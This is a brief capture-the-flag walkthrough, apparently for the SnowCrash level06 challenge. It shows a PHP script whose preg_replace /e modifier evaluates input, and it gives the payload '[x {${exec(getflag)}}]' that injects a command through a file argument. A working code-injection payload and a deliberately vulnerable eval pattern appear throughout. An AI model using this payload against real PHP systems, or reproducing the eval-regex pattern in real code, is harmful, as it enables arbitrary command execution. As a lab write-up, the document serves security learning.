We can see 2 files, 1 binary and 1 php file.
When we execute the binary, there is an error : 'PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4'
We can see that the binary execute the php file.
The php file is :

<?php
function y($m) {
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m;
}
function x($y, $z) {
	$a = file_get_contents($y);
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	$a = preg_replace("/\[/", "(", $a);
	$a = preg_replace("/\]/", ")", $a);
	return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>

The executable file requires a file to pass to the php script.
It will read the file content and make it go thourgh a lot of regex.
Our goal is to find an initial value that will execute 'getflag' after all the regex have been applied and store it in a file.
The first regex use '/e' which run the 'eval' function which execute a string as a php script.
So we want to pass a php script that will execute getflag and we will do that with 'exec'.
We will pass '[x {${exec(getflag)}}]' so that the regex find a match and execute the string.
We need the '$' to get the value returned.
We then execute it with './level06 /tmp/path_to_file' and end up with a php error that contains the flag. 

level06@SnowCrash:~$ ./level06 /tmp/file
